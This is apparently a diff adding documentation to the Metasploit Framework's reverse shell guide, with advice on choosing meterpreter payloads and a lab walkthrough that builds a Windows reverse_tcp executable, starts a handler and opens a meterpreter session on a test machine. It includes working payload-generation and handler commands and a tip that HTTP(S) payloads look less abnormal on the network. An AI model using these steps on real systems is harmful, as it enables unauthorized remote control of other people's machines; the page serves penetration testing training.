@@ -4,6 +4,18 @@ The basic usage of payloads is already quite well documented in the [Users Guide
 
 ## List of Metasploit reverse shells
 
+As of now, there are 168 different reverse shells in the Metasploit Framework. We will not list all of them here, because that's just straight up spamming. But if you'd like, you can run the following command to get msfpayload to tell you:
+
+```bash
+./msfpayload -l |grep reverse
+```
+
+As a rule of thumb, always pick a meterpreter, because it currently provides better support of post exploitation Metasploit has to offer. For example, railgun, post modules, unique meterpreter commands (like webcam controls), etc.
+
+In Windows, the most commonly used reverse shell is windows/meterpreter/reverse. But you can also try windows/meterpreter/reverse_http or windows/meterpreter/reverse_https, because their network traffic appear a little bit less abnormal.
+
+In Linux, you can also try linux/x86/meterpreter/reverse_tcp, or the 64-bit one. However, just know that linux/x86/shell_reverse_tcp has been the most stable.
+
 ## When to use a reverse shell
 
 If you find yourself in one of the following scenarios (but not limited to), then you should consider using a reverse shell:
@@ -37,3 +49,82 @@ You should make sure the listener has started first before executing the reverse
 
 ## Demonstration
 
+In this demonstration, we have two boxes:
+
+**Box A:**
+
+* The attacker's box that receives the payload session
+* IP is: 192.168.1.64 (ifconfig)
+* On the same network as the victim machine
+
+**Box B:**
+
+* The "victim" machine
+* Windows XP
+* IP is: 192.168.1.80 (ipconfig)
+* On the same network as the attacker machine
+* For testing purposes, no antivirus enabled.
+* For testing purposes, no firewall enabled, either.
+
+**Step 1: I generate my executable payload:**
+
+On the attacker's box, I run msfpayload like the following (or msfvenom, whatever you prefer):
+
+
+```bash
+$ ./msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.64 lport=4444 X > /tmp/iambad.exe  
+Created by msfpayload (http://www.metasploit.com).  
+Payload: windows/meterpreter/reverse_tcp  
+Length: 287  
+Options: {"LHOST"=>"192.168.1.64", "LPORT"=>"4444"}  
+```
+
+**Step 2: I copy my executable payload to Box B (my victim machine)**
+ 
+This step requires no further explanation.
+
+**Step 3: I set up my payload handler on box A (the attacker's box):**
+
+```bash
+$ ./msfconsole -q  
+msf > use exploit/multi/handler  
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
+payload => windows/meterpreter/reverse_tcp  
+msf exploit(handler) > set lhost 192.168.1.64  
+lhost => 192.168.1.64  
+msf exploit(handler) > set lport 4444  
+lport => 4444  
+msf exploit(handler) > run  
+  
+[*] Started reverse handler on 192.168.1.64:4444  
+[*] Starting the payload handler...  
+```
+
+**Step 4: I double-click on the malicious executable**
+ 
+This step requires no further explanation.
+ 
+**Step 5: I should see a meterpreter/payload session on box A (the attacker's box)**
+ 
+Like this:
+
+
+```bash
+$ ./msfconsole -q  
+msf > use exploit/multi/handler  
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
+payload => windows/meterpreter/reverse_tcp  
+msf exploit(handler) > set lhost 192.168.1.64  
+lhost => 192.168.1.64  
+msf exploit(handler) > set lport 4444  
+lport => 4444  
+msf exploit(handler) > run  
+  
+[*] Started reverse handler on 192.168.1.64:4444  
+[*] Starting the payload handler...  
+[*] Sending stage (770048 bytes) to 192.168.1.80  
+[*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500  
+meterpreter >  
+```
+
+The meterpreter prompt means you are currently interacting with the payload.
